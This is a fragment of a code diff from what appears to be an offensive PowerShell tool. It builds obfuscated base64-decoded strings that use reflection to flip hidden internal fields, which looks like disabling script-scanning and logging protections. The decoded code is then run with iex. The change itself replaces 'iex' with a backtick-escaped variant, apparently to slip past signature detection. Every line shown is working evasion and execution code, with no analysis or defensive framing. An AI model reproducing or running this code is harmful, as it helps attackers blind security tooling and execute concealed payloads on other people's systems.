@@ -43,7 +43,7 @@ $text2="');[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGt
 "`$cc = [System.Text.Encoding]::ASCII.GetString(`$c);"+
 "[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$d)).GetField([System.Text.Encoding]::ASCII.GetString(`$e),'NonPublic, Static').SetValue(`$null, `$true);"+
 "[Reflection.Assembly]::LoadWithPartialName([System.Text.Encoding]::ASCII.GetString(`$f)).GetType([System.Text.Encoding]::ASCII.GetString(`$g)).GetField([System.Text.Encoding]::ASCII.GetString(`$h),'NonPublic, Instance').SetValue([Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$i)).GetField([System.Text.Encoding]::ASCII.GetString(`$j),'NonPublic, Static').GetValue(`$null),0);"+
-"iex(`$cc);"
+"i``ex(`$cc);"
 
 If(![String]::IsNullOrEmpty($c) -and [String]::IsNullOrEmpty($f)){
     $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($c))
